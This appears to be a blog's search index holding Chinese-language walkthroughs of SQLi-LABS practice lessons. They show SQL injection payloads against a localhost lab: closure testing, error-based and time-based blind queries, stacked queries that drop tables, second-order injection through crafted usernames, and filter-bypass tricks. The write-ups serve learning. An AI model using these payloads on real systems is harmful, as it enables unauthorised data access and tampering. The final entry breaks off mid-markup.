<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>SQLi-LABS 学习SQL注入4</title>
      <link href="/2018/06/30/SQLi-LABS-%E5%AD%A6%E4%B9%A0SQL%E6%B3%A8%E5%85%A54/"/>
      <url>/2018/06/30/SQLi-LABS-%E5%AD%A6%E4%B9%A0SQL%E6%B3%A8%E5%85%A54/</url>
      
        <content type="html"><![CDATA[<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>SQLi-LABS 学习SQL注入(less 54-less65 )<br><a id="more"></a></p><h2 id="Less-54"><a href="#Less-54" class="headerlink" title="Less-54"></a>Less-54</h2><p>你需要在数据库中找到密钥</p><p><img src="/SQLi-LABS-学习SQL注入4/20190327063957092.png" alt></p><p>百度翻译，就是说你最多只能尝试10次，10次之后就会自动重置随机表名，列名，数据表。</p><p><img src="/SQLi-LABS-学习SQL注入4/20190327064003508.png" alt></p><p>单引号闭合发现不会报错</p><p><img src="/SQLi-LABS-学习SQL注入4/20190327064009814.png" alt></p><p>应该是单引号闭合</p><p><img src="/SQLi-LABS-学习SQL注入4/20190327064018960.png" alt></p><p>而且不是oder by注入</p><p><img src="/SQLi-LABS-学习SQL注入4/20190327064028958.png" alt></p><p>3个查询字段</p><p><img src="/SQLi-LABS-学习SQL注入4/20190327064035135.png" alt></p><p>爆表名<code>2xjj4aw1b1</code></p><p><img src="/SQLi-LABS-学习SQL注入4/20190327064047739.png" alt></p><p>爆字段名<code>id,sessid,secret_XQ1M,tryy</code></p><p><img src="/SQLi-LABS-学习SQL注入4/20190327064058973.png" alt></p><p>爆数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&gt;2955104571741a361ca41d687dd3649c&gt;Zi2thuqZHQCUsyS7coRR5cWu&gt;8&gt;</span><br></pre></td></tr></table></figure></p><p><img src="/SQLi-LABS-学习SQL注入4/20190327064130018.png" alt></p><p><img src="/SQLi-LABS-学习SQL注入4/20190327064145813.png" alt></p><h2 id="less-55"><a href="#less-55" class="headerlink" title="less-55"></a>less-55</h2><p>同样不会报错，只能猜或者盲注。发现<code>数字,&#39;,&quot;,&#39;),&quot;)</code>闭合都不对,空格和注释也没有被过滤。</p><p><img src="/SQLi-LABS-学习SQL注入4/20190327064221302.png" alt></p><p>看了答案第一次见到(变量)这种闭合方式，不是oder by注入</p><p><img src="/SQLi-LABS-学习SQL注入4/20190327064230171.png" alt></p><p>那其余步骤就跟上一题一样了。</p><p><img src="/SQLi-LABS-学习SQL注入4/20190327064239101.png" alt></p><p>爆表</p><p><img src="/SQLi-LABS-学习SQL注入4/20190327064246562.png" alt></p><p>爆字段</p><p><img src="/SQLi-LABS-学习SQL注入4/20190327064253031.png" alt></p><p>爆数据</p><p><img src="/SQLi-LABS-学习SQL注入4/20190327064259751.png" alt></p><h2 id="Less-56"><a href="#Less-56" class="headerlink" title="Less-56"></a>Less-56</h2><p>不会报错，不是双引号闭合</p><p><img src="/SQLi-LABS-学习SQL注入4/20190327064312656.png" alt></p><p>是(‘变量’)闭合</p><p><img src="/SQLi-LABS-学习SQL注入4/20190327064321016.png" alt></p><p><img src="/SQLi-LABS-学习SQL注入4/20190327064328792.png" alt></p><p>其余操作同上</p><p><img src="/SQLi-LABS-学习SQL注入4/20190327064338454.png" alt></p><h2 id="Less-57"><a href="#Less-57" class="headerlink" title="Less-57"></a>Less-57</h2><p>双引号闭合</p><p><img src="/SQLi-LABS-学习SQL注入4/20190327064349960.png" alt></p><h2 id="Less-58"><a href="#Less-58" class="headerlink" title="Less-58"></a>Less-58</h2><p>单引号报错，发现是单引号闭合</p><p><img src="/SQLi-LABS-学习SQL注入4/20190327064400821.png" alt></p><p>可union不起作用,而且没有过滤select union</p><p><img src="/SQLi-LABS-学习SQL注入4/20190327064407122.png" alt></p><p>看下源代码</p><p><img src="/SQLi-LABS-学习SQL注入4/20190327064417921.png" alt></p><p>根据id值输出的是固定的数组，没有调用数据库中的数据。不过有报错信息，可以用报错函数。</p><p>爆表名</p><p><img src="/SQLi-LABS-学习SQL注入4/20190327064428742.png" alt></p><p>爆字段名</p><p><img src="/SQLi-LABS-学习SQL注入4/20190327064447597.png" alt></p><p>爆数据</p><p><img src="/SQLi-LABS-学习SQL注入4/20190327064452290.png" alt><br><img src="/SQLi-LABS-学习SQL注入4/20190327064503042.png" alt></p><h2 id="Less-59"><a href="#Less-59" class="headerlink" title="Less-59"></a>Less-59</h2><p>报错显示数字型</p><p><img src="/SQLi-LABS-学习SQL注入4/20190327064514513.png" alt></p><p>同样union没有作用，用报错函数，步骤同上</p><p><img src="/SQLi-LABS-学习SQL注入4/20190327064520920.png" alt></p><h2 id="Less-60"><a href="#Less-60" class="headerlink" title="Less-60"></a>Less-60</h2><p>双引号报错显示(“变量”)闭合方式</p><p><img src="/SQLi-LABS-学习SQL注入4/20190327064536204.png" alt></p><p>union不起作用，用报错函数</p><p><img src="/SQLi-LABS-学习SQL注入4/20190327064544499.png" alt></p><p><img src="/SQLi-LABS-学习SQL注入4/20190327064600031.png" alt></p><h2 id="Less-61"><a href="#Less-61" class="headerlink" title="Less-61"></a>Less-61</h2><p>单引号报错，((‘闭合’))</p><p><img src="/SQLi-LABS-学习SQL注入4/20190327064608756.png" alt></p><p>同上</p><p><img src="/SQLi-LABS-学习SQL注入4/20190327064617717.png" alt></p><h2 id="Less-62"><a href="#Less-62" class="headerlink" title="Less-62"></a>Less-62</h2><p>不会报错，可以尝试130次，肯定就是盲注了。</p><p><img src="/SQLi-LABS-学习SQL注入4/20190327064629111.png" alt></p><p>不是双引号闭合</p><p><img src="/SQLi-LABS-学习SQL注入4/20190327064634049.png" alt></p><p>不是括号双引号闭合</p><p><img src="/SQLi-LABS-学习SQL注入4/20190327064645623.png" alt></p><p>是括号单引号闭合</p><p><img src="/SQLi-LABS-学习SQL注入4/20190327064653117.png" alt></p><p><img src="/SQLi-LABS-学习SQL注入4/20190327064701644.png" alt></p><p>然后写脚本盲注吧<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-62/index.php?id=1&apos;) and if(ascii(substr(database(),1,1))=99,1,sleep(5)) -- k</span><br></pre></td></tr></table></figure></p><h2 id="Less-63"><a href="#Less-63" class="headerlink" title="Less-63"></a>Less-63</h2><p>和Less-62一样，闭合方式变为单引号闭合</p><p><img src="/SQLi-LABS-学习SQL注入4/20190327064806441.png" alt></p><p><img src="/SQLi-LABS-学习SQL注入4/20190327064821745.png" alt></p><h2 id="Less-64"><a href="#Less-64" class="headerlink" title="Less-64"></a>Less-64</h2><p>又一个没见过的闭合方式(())</p><p><img src="/SQLi-LABS-学习SQL注入4/20190327064832058.png" alt></p><p><img src="/SQLi-LABS-学习SQL注入4/20190327064840295.png" alt><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-64/index.php?id=1)) and if(ascii(substr(database(),1,1))=99,1,sleep(5))--+</span><br></pre></td></tr></table></figure></p><h2 id="Less-65"><a href="#Less-65" class="headerlink" title="Less-65"></a>Less-65</h2><p>(“变量”)闭合</p><p><img src="/SQLi-LABS-学习SQL注入4/20190327064917636.png" alt></p><p><img src="/SQLi-LABS-学习SQL注入4/20190327064935128.png" alt><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-65/?id=1&quot;) and if(ascii(substr(database(),1,1))=99,1,sleep(5))--+</span><br></pre></td></tr></table></figure></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.注入步骤，先看是否会报错，如果有报错直接就能看到是什么闭合方式，然后可以用union注入，updatexml、extractvalue函数显错注入或者select count(*),concat() from information_schmea.tables where table_schema=&apos; &apos; group by x。如果不会报错，看正确和错误页面显示信息是否一样，如果不一样可以用布尔盲注，时间盲注，如果一样的话只能用时间盲注。</span><br><span class="line">2.我认为最重要的步骤是在不会显错的情况下去判断闭合方式，有时候会因为引号或者括号没有闭合以及MySQL的隐式转换导致正确显示信息，这时候要用and 1=0 1=1或者 and if(1=1,sleep(5),null)去判断是否是真正的闭合方式。当然如果仍然判断不出来的话，继续注入，如果发现错误可能就是闭合方式判断错误</span><br><span class="line">3.需要尝试的闭合方式(),(()),&apos; &apos;,&quot; &quot;,(&apos; &apos;),(&quot; &quot;),((&apos; &apos;)),((&quot; &quot;)),数字型</span><br><span class="line">4.当引号被转以尝试宽字节注入，注释被过滤就闭合后面多出来的闭合符号，空格被过滤尝试%a0,/**/，加括号等方式，and，or被过滤，用aandnd和oorr代替，或者用逻辑运算符||和&amp;&amp;(%26%26),</span><br><span class="line">5.union,select被过滤，可以用大小写绕过，还有一种是union和select在一起的时候会被过滤</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>介绍：仅供技术交流学习探讨，请勿用于非法用途。本文部分资源来源于网络，如有侵权请联系版主删除。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQLi-LABS 学习SQL注入3</title>
      <link href="/2018/06/20/SQLi-LABS-%E5%AD%A6%E4%B9%A0SQL%E6%B3%A8%E5%85%A53/"/>
      <url>/2018/06/20/SQLi-LABS-%E5%AD%A6%E4%B9%A0SQL%E6%B3%A8%E5%85%A53/</url>
      
        <content type="html"><![CDATA[<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>SQLi-LABS 学习SQL注入(less 39-less53 )<br><a id="more"></a></p><h2 id="Less-39"><a href="#Less-39" class="headerlink" title="Less-39"></a>Less-39</h2><p>单引号闭合根据报错发现是数字型注入</p><p><img src="/SQLi-LABS-学习SQL注入3/20190327062412584.png" alt></p><p>看源码跟less-38一样，都是堆叠注入，只是单引号闭合变为数字型了。</p><p><img src="/SQLi-LABS-学习SQL注入3/20190327062420712.png" alt></p><p>另外分号后面的语句显示的结果是显示不出来的</p><p><img src="/SQLi-LABS-学习SQL注入3/20190327062516177.png" alt></p><h2 id="Less-40"><a href="#Less-40" class="headerlink" title="Less-40"></a>Less-40</h2><p>与Less38和Less39一样，就是闭合方式变为(‘变量’)，而且不会报错，需要用盲注猜测闭合方式</p><p><img src="/SQLi-LABS-学习SQL注入3/20190327062616222.png" alt></p><p>不是单引号和双引号闭合</p><p><img src="/SQLi-LABS-学习SQL注入3/20190327062652968.png" alt></p><p>是括号加单引号闭合</p><p><img src="/SQLi-LABS-学习SQL注入3/20190327062709551.png" alt></p><p>同样可以用堆叠注入</p><p><img src="/SQLi-LABS-学习SQL注入3/20190327062721826.png" alt></p><p><img src="/SQLi-LABS-学习SQL注入3/20190327062743049.png" alt></p><h2 id="Less-41"><a href="#Less-41" class="headerlink" title="Less-41"></a>Less-41</h2><p>同样是堆叠注入，不会报错，变为数字型注入。</p><h2 id="Less-42"><a href="#Less-42" class="headerlink" title="Less-42"></a>Less-42</h2><p>单引号闭合绕过</p><p><img src="/SQLi-LABS-学习SQL注入3/20190327062804093.png" alt></p><p>源码中过滤了user，没有过滤password</p><p><img src="/SQLi-LABS-学习SQL注入3/20190327062817772.png" alt></p><p>由于源码中仍然有</p><p><img src="/SQLi-LABS-学习SQL注入3/20190327062827780.png" alt></p><p>所以可以继续使用堆叠注入,创建一个等于users的text2表，</p><p><img src="/SQLi-LABS-学习SQL注入3/20190327062836403.png" alt></p><p><img src="/SQLi-LABS-学习SQL注入3/20190327062850076.png" alt></p><p>当然更改密码页面也有一个之前用过的漏洞就不再写了</p><p><img src="/SQLi-LABS-学习SQL注入3/20190327062858624.png" alt></p><h2 id="Less-43"><a href="#Less-43" class="headerlink" title="Less-43"></a>Less-43</h2><p>单引号报错</p><p><img src="/SQLi-LABS-学习SQL注入3/20190327062924941.png" alt></p><p><img src="/SQLi-LABS-学习SQL注入3/20190327062934323.png" alt></p><p>以为是数字型注入，发现进不去。最后发现是括号加单引号闭合</p><p><img src="/SQLi-LABS-学习SQL注入3/20190327062934323.png" alt></p><p>其余等同Less-42<br>这样他会报错 ‘ ‘</p><p><img src="/SQLi-LABS-学习SQL注入3/20190327063003482.png" alt></p><p><img src="/SQLi-LABS-学习SQL注入3/20190327063010708.png" alt></p><h2 id="Less-44"><a href="#Less-44" class="headerlink" title="Less-44"></a>Less-44</h2><p>这里和42其实相差不多，只不多这里没有了报错，但是注入语句还是一样的<br>直接就进去了</p><p><img src="/SQLi-LABS-学习SQL注入3/20190327063023143.png" alt></p><p>多试几种闭合方式，如果不行就用布尔盲注。</p><h2 id="Less-45"><a href="#Less-45" class="headerlink" title="Less-45"></a>Less-45</h2><p>依然是堆叠注入，这也跟前面的一样，就是不会报错了，各种尝试就好了</p><p><img src="/SQLi-LABS-学习SQL注入3/20190327063042646.png" alt></p><h2 id="Less-46-ORDER-BY-Error-Numeric（第46节：GET-基于错误-数字型-ORDER-BY-从句）"><a href="#Less-46-ORDER-BY-Error-Numeric（第46节：GET-基于错误-数字型-ORDER-BY-从句）" class="headerlink" title="Less - 46 ORDER BY-Error-Numeric（第46节：GET - 基于错误 - 数字型 - ORDER BY 从句）"></a>Less - 46 ORDER BY-Error-Numeric（第46节：GET - 基于错误 - 数字型 - ORDER BY 从句）</h2><p>发现标题变了</p><p><img src="/SQLi-LABS-学习SQL注入3/20190327063050233.png" alt></p><p>看一下源码，发现语句变为<code>select * from users order by $id;</code>,也就是输进去的id值是对应的那一列排序。</p><p><img src="/SQLi-LABS-学习SQL注入3/20190327063122357.png" alt></p><p>sort=1</p><p><img src="/SQLi-LABS-学习SQL注入3/20190327063131787.png" alt></p><p>sort=1’,数字型注入</p><p><img src="/SQLi-LABS-学习SQL注入3/20190327063141866.png" alt></p><p><code>select * from tablename order by id desc:</code>根据id字段按照降序排列，从大到小<br><code>select * from tablename order by id asc:</code>根据id字段按照升序排列，从小到大<br>asc 按升序排列<br>desc 按降序排列<br>可以用sort=1 desc和sort=1 asc来判断是否存在oder by 注入</p><p><img src="/SQLi-LABS-学习SQL注入3/20190327063205252.png" alt></p><p>这道题有报错信息，可以用updatexml报错函数，盲注也可以</p><p><img src="/SQLi-LABS-学习SQL注入3/20190327063213175.png" alt></p><p>extractvalue函数当然也可以</p><p><img src="/SQLi-LABS-学习SQL注入3/20190327063220924.png" alt></p><p>然后用select语句替换concat就可以查询想要的信息。<br>盲注,两个and，前两个条件只要有一个条件是false就不会运行if语句。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-lab/Less-46/index.php?sort=1 and if(1=1, sleep(1), null)</span><br><span class="line">http://localhost/sqli-lab/Less-46/index.php?sort=1 and (length(database())) = 8 and if(1=1, sleep(1), null)</span><br><span class="line">http://localhost/sqli-lab/Less-46/index.php?sort=1 and (ascii(substr((select database()) ,1,1))) = 115 and if(1=1, sleep(1), null)</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/zyz511919766/article/details/42241211" target="_blank" rel="noopener">关于MySQL的SLEEP(N)函数</a></p><h2 id="Less-47-ORDER-BY-Clause-Error-Single-quote（第47节：ORDER-BY-从句-基于错误-单引号-）"><a href="#Less-47-ORDER-BY-Clause-Error-Single-quote（第47节：ORDER-BY-从句-基于错误-单引号-）" class="headerlink" title="Less - 47 ORDER BY Clause-Error-Single quote（第47节：ORDER BY 从句 - 基于错误-单引号 ）"></a>Less - 47 ORDER BY Clause-Error-Single quote（第47节：ORDER BY 从句 - 基于错误-单引号 ）</h2><p>单引号报错，知道是单引号闭合</p><p><img src="/SQLi-LABS-学习SQL注入3/20190327063401344.png" alt></p><p>desc正确判断是order by注入</p><p><img src="/SQLi-LABS-学习SQL注入3/20190327063409976.png" alt></p><p>其余同上</p><h2 id="Less-48-ORDER-BY-Clause-Blind-based（第48节：ORDER-BY-从句-基于盲注-）"><a href="#Less-48-ORDER-BY-Clause-Blind-based（第48节：ORDER-BY-从句-基于盲注-）" class="headerlink" title="Less - 48 ORDER BY Clause Blind based（第48节：ORDER BY 从句 基于盲注 ）"></a>Less - 48 ORDER BY Clause Blind based（第48节：ORDER BY 从句 基于盲注 ）</h2><p>order by注入，没有报错信息</p><p><img src="/SQLi-LABS-学习SQL注入3/20190327063430134.png" alt></p><p>盲注<code>id=1&#39;,1&quot;,1&#39;),1&quot;,1</code></p><p><img src="/SQLi-LABS-学习SQL注入3/20190327063441343.png" alt></p><p>发现是数字型注入。<br>然后用报错函数或者盲注</p><h2 id="Less-49-ORDER-BY-Clause-Blind-based（第49节：ORDER-BY-从句-基于盲注-）"><a href="#Less-49-ORDER-BY-Clause-Blind-based（第49节：ORDER-BY-从句-基于盲注-）" class="headerlink" title="Less - 49 ORDER BY Clause Blind based（第49节：ORDER BY 从句 基于盲注 ）"></a>Less - 49 ORDER BY Clause Blind based（第49节：ORDER BY 从句 基于盲注 ）</h2><p>依然不会报错，盲注发现是单引号闭合</p><p><img src="/SQLi-LABS-学习SQL注入3/20190327063456653.png" alt></p><p>然后用报错函数或盲注</p><h2 id="Less-50-ORDER-BY-Clause-Blind-based（第50节：ORDER-BY-从句-基于盲注）"><a href="#Less-50-ORDER-BY-Clause-Blind-based（第50节：ORDER-BY-从句-基于盲注）" class="headerlink" title="Less - 50 ORDER BY Clause Blind based（第50节：ORDER BY 从句 基于盲注）"></a>Less - 50 ORDER BY Clause Blind based（第50节：ORDER BY 从句 基于盲注）</h2><p>desc,asc判断是order by注入，单引号报错，是数字型</p><p><img src="/SQLi-LABS-学习SQL注入3/20190327063508020.png" alt></p><p>然后用报错函数或盲注</p><h2 id="Less-51-ORDER-BY-Clause-Blind-based（第51节：ORDER-BY-从句-基于盲注-）"><a href="#Less-51-ORDER-BY-Clause-Blind-based（第51节：ORDER-BY-从句-基于盲注-）" class="headerlink" title="Less - 51 ORDER BY Clause Blind based（第51节：ORDER BY 从句 基于盲注 ）"></a>Less - 51 ORDER BY Clause Blind based（第51节：ORDER BY 从句 基于盲注 ）</h2><p>desc,asc判断是order by注入，单引号报错，是单引号闭合desc,asc判断是order by注入</p><p><img src="/SQLi-LABS-学习SQL注入3/20190327063522353.png" alt></p><p>报错函数或盲注</p><p><img src="/SQLi-LABS-学习SQL注入3/20190327063532758.png" alt></p><p>怎么感觉跟前面一摸一样，看了下源代码发现Less50和Less51都有</p><p><img src="/SQLi-LABS-学习SQL注入3/20190327063539568.png" alt></p><p>这个函数，可以进行堆叠注入</p><p><img src="/SQLi-LABS-学习SQL注入3/20190327063547972.png" alt></p><p>比如删除text2表</p><p><img src="/SQLi-LABS-学习SQL注入3/20190327063555312.png" alt></p><h2 id="Less-52-ORDER-BY-Clause-Blind-based（第52节：ORDER-BY-从句-基于盲注-）"><a href="#Less-52-ORDER-BY-Clause-Blind-based（第52节：ORDER-BY-从句-基于盲注-）" class="headerlink" title="Less - 52 ORDER BY Clause Blind based（第52节：ORDER BY 从句 基于盲注 ）"></a>Less - 52 ORDER BY Clause Blind based（第52节：ORDER BY 从句 基于盲注 ）</h2><p>单双引号不会报错，盲注判断为数字型</p><p><img src="/SQLi-LABS-学习SQL注入3/20190327063610172.png" alt></p><p>源代码依然有</p><p><img src="/SQLi-LABS-学习SQL注入3/20190327063620640.png" alt></p><p>可以进行堆叠注入，其余跟51差不多。</p><h2 id="Less-53-ORDER-BY-Clause-Blind-based（第53节：ORDER-BY-从句-基于盲注-）"><a href="#Less-53-ORDER-BY-Clause-Blind-based（第53节：ORDER-BY-从句-基于盲注-）" class="headerlink" title="Less - 53 ORDER BY Clause Blind based（第53节：ORDER BY 从句 基于盲注 ）"></a>Less - 53 ORDER BY Clause Blind based（第53节：ORDER BY 从句 基于盲注 ）</h2><p>不显示报错信息，盲注发现为单引号闭合</p><p><img src="/SQLi-LABS-学习SQL注入3/20190327063647644.png" alt></p><p>同样可以进行堆叠注入，其他同前几道题。</p><p>介绍：仅供技术交流学习探讨，请勿用于非法用途。本文部分资源来源于网络，如有侵权请联系版主删除。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQLi-LABS 学习SQL注入2</title>
      <link href="/2018/06/10/SQLi-LABS-%E5%AD%A6%E4%B9%A0SQL%E6%B3%A8%E5%85%A5_2/"/>
      <url>/2018/06/10/SQLi-LABS-%E5%AD%A6%E4%B9%A0SQL%E6%B3%A8%E5%85%A5_2/</url>
      
        <content type="html"><![CDATA[<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>SQLi-LABS 学习SQL注入(less 23-less38 )<br><a id="more"></a></p><h2 id="less-23-GET-Error-based-strip-comments-基于错误的，过滤注释的GET型"><a href="#less-23-GET-Error-based-strip-comments-基于错误的，过滤注释的GET型" class="headerlink" title="less 23 GET - Error based - strip comments (基于错误的，过滤注释的GET型)"></a>less 23 GET - Error based - strip comments (基于错误的，过滤注释的GET型)</h2><p>先单引号让他报错</p><p><img src="/SQLi-LABS-学习SQL注入_2/20190327045419933.png" alt></p><p>可以知道是单引号闭合。<br>然后发现–和#都被过滤了</p><p><img src="/SQLi-LABS-学习SQL注入_2/20190327045429782.png" alt></p><p>那么就只能用闭合后面引号的方法，根据报错可以知道语句为<code>id=&#39;$ID&#39; limit 0,1</code><br>那么可以这样闭合<code>id=&#39;1&#39; or &#39;1&#39;=&#39;1&#39; limit 0,1</code><br>或者是<code>id=&#39;1&#39; and &#39;1&#39;=&#39;1&#39; limit 0,1</code></p><p><img src="/SQLi-LABS-学习SQL注入_2/20190327045454482.png" alt></p><h2 id="less-24-Second-Degree-Injections-Real-treat-Store-Injections-二次注入"><a href="#less-24-Second-Degree-Injections-Real-treat-Store-Injections-二次注入" class="headerlink" title="less-24 - Second Degree Injections Real treat -Store Injections (二次注入)"></a>less-24 - Second Degree Injections Real treat -Store Injections (二次注入)</h2><p>这是一个完整的注册登陆以及改密网站</p><p><img src="/SQLi-LABS-学习SQL注入_2/20190327045508132.png" alt></p><p>真正有跟数据库交互的就<code>login_create.php，login.php，pass_change.php</code>这三个文件</p><p><a href="http://www.w3school.com.cn/php/func_mysql_real_escape_string.asp" target="_blank" rel="noopener">PHP mysql_real_escape_string() 函数</a></p><p>login.php</p><p><img src="/SQLi-LABS-学习SQL注入_2/20190327045626658.png" alt></p><p>login_create.php</p><p><img src="/SQLi-LABS-学习SQL注入_2/20190327045638450.png" alt></p><p>pass_change.php</p><p><img src="/SQLi-LABS-学习SQL注入_2/20190327045645779.png" alt><br><img src="/SQLi-LABS-学习SQL注入_2/20190327045654819.png" alt></p><p>发现只有<code>$_SESSION[&quot;username&quot;]</code>没有被过滤,这个SQL语句是用来更改密码的，而且<code>mysql_real_escape_string()</code>函数只会过滤以下字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">\x00</span><br><span class="line">\n</span><br><span class="line">\r</span><br><span class="line">\</span><br><span class="line">&apos;</span><br><span class="line">&quot;</span><br><span class="line">\x1a</span><br></pre></td></tr></table></figure><p>而注释是不会过滤掉的，我们可以注册一个包含注释符号的username，然后用这个username更改密码的时候会被注入到update语句中，更改注释前面的用户名的密码。</p><p><img src="/SQLi-LABS-学习SQL注入_2/20190327045804251.png" alt></p><p>比如我们想更改用户名为Dummy的密码，我们可以注册一个<code>username=Dummy&#39; -- k</code></p><p><img src="/SQLi-LABS-学习SQL注入_2/20190327045813914.png" alt></p><p>然后登陆更改密码为456</p><p><img src="/SQLi-LABS-学习SQL注入_2/20190327045826082.png" alt></p><p>而你会发现Dummy的密码变为了456，而<code>Dummy&#39; -- k</code>的密码还是123</p><p><img src="/SQLi-LABS-学习SQL注入_2/20190327045838396.png" alt></p><p>可能有人会说注册的时候不是被过滤了单引号吗。<br>我们<code>admin&#39; --</code>变成了<code>admin&#39; --</code>,还是正常闭合了，但是存进数据库的时候他依旧是一个单引号。（转义只是暂时在这里使它失去了单引号的作用，但它还是表示单引号）</p><p><img src="/SQLi-LABS-学习SQL注入_2/20190327045900944.png" alt></p><h2 id="less-25-Trick-with-OR-amp-AND-过滤了or和and"><a href="#less-25-Trick-with-OR-amp-AND-过滤了or和and" class="headerlink" title="less 25 Trick with OR &amp; AND (过滤了or和and)"></a>less 25 Trick with OR &amp; AND (过滤了or和and)</h2><p>单引号报错</p><p><img src="/SQLi-LABS-学习SQL注入_2/20190327045924719.png" alt></p><p>发现是单引号闭合，注释也正常</p><p><img src="/SQLi-LABS-学习SQL注入_2/20190327045932126.png" alt></p><p>发现被过滤了and和or</p><p><img src="/SQLi-LABS-学习SQL注入_2/20190327045939365.png" alt></p><p><img src="/SQLi-LABS-学习SQL注入_2/20190327045947986.png" alt></p><p><a href="http://www.cnblogs.com/hubqin/p/6749433.html" target="_blank" rel="noopener">正则表达式模式修饰符</a><br>开了 i 模式不能用大小写绕过。</p><p><img src="/SQLi-LABS-学习SQL注入_2/20190327050147950.png" alt></p><p>我们可以用&amp;&amp;代替and，||代替or。</p><p><img src="/SQLi-LABS-学习SQL注入_2/20190327050154606.png" alt></p><p><img src="/SQLi-LABS-学习SQL注入_2/20190327050204252.png" alt></p><p>&amp;要换成%26url编码</p><p>双写也是可以的，因为他只过滤一次。</p><p><img src="/SQLi-LABS-学习SQL注入_2/20190327050214042.png" alt></p><p><img src="/SQLi-LABS-学习SQL注入_2/20190327050234672.png" alt></p><p>这道题用union也是可以的。</p><h2 id="less-25a-Trick-with-OR-amp-AND-Blind-（过滤了or和and的盲注）"><a href="#less-25a-Trick-with-OR-amp-AND-Blind-（过滤了or和and的盲注）" class="headerlink" title="less 25a Trick with OR &amp; AND Blind （过滤了or和and的盲注）"></a>less 25a Trick with OR &amp; AND Blind （过滤了or和and的盲注）</h2><p>跟less25一样只不过错误信息被屏蔽了。and和or也被过滤了。而注释没有被过滤</p><p><img src="/SQLi-LABS-学习SQL注入_2/20190327050302213.png" alt></p><p><img src="/SQLi-LABS-学习SQL注入_2/20190327050310243.png" alt></p><p>发现是数字型注入</p><p><img src="/SQLi-LABS-学习SQL注入_2/20190327050320968.png" alt></p><p>延时注入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-25a/?id=1 %26%26 if(length(database)=8,1,sleep(5))</span><br></pre></td></tr></table></figure></p><p>联合查询</p><p><img src="/SQLi-LABS-学习SQL注入_2/20190327050458206.png" alt></p><h2 id="less-26-Trick-with-comments-and-space-过滤了注释和空格的注入"><a href="#less-26-Trick-with-comments-and-space-过滤了注释和空格的注入" class="headerlink" title="less 26 Trick with comments and space (过滤了注释和空格的注入)"></a>less 26 Trick with comments and space (过滤了注释和空格的注入)</h2><p>通过输入<code>and1,or1,--1,/*1,/1,1,1&#39; &#39; &#39; &#39;</code></p><p><img src="/SQLi-LABS-学习SQL注入_2/20190327050458206.png" alt></p><p>发现被过滤了and，or，单行多行注释，/ ,空格，没有过滤单引号。</p><p><img src="/SQLi-LABS-学习SQL注入_2/20190327050533405.png" alt></p><p>对于注释和结尾字符的我们此处只能利用构造一个 ‘ 来闭合后面到 ‘ ；对于空格，有较多的方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%09 TAB键（水平）</span><br><span class="line">%0a 新建一行</span><br><span class="line">%0c 新的一页</span><br><span class="line">%0d return功能</span><br><span class="line">%0b TAB键（垂直）</span><br><span class="line">%a0 空格(应该是php转化的时候是一个特殊字符，然后mysql会解释为空白字符)</span><br></pre></td></tr></table></figure></p><p><img src="/SQLi-LABS-学习SQL注入_2/20190327050551928.png" alt></p><p>查数据库名</p><p><img src="/SQLi-LABS-学习SQL注入_2/20190327050558950.png" alt></p><p>查列名，不要忘记information中的or被过滤了</p><p><img src="/SQLi-LABS-学习SQL注入_2/20190327050605517.png" alt></p><p><img src="/SQLi-LABS-学习SQL注入_2/20190327050612804.png" alt></p><p>查字段</p><p><img src="/SQLi-LABS-学习SQL注入_2/20190327050619364.png" alt></p><p>查数据，不要忘了password中的or</p><p><img src="/SQLi-LABS-学习SQL注入_2/20190327050629773.png" alt></p><h2 id="less-26a-GET-Blind-Based-All-your-SPACES-and-COMMENTS-belong-to-us-过滤了空格和注释的盲注"><a href="#less-26a-GET-Blind-Based-All-your-SPACES-and-COMMENTS-belong-to-us-过滤了空格和注释的盲注" class="headerlink" title="less 26a GET - Blind Based - All your SPACES and COMMENTS belong to us(过滤了空格和注释的盲注)"></a>less 26a GET - Blind Based - All your SPACES and COMMENTS belong to us(过滤了空格和注释的盲注)</h2><p>跟25的区别是不会报错，闭合方式变为(‘变量’)。</p><p><img src="/SQLi-LABS-学习SQL注入_2/20190327050651495.png" alt></p><h2 id="less-27-GET-Error-Based-All-your-UNION-amp-SELECT-belong-to-us-（过滤了union和select的）"><a 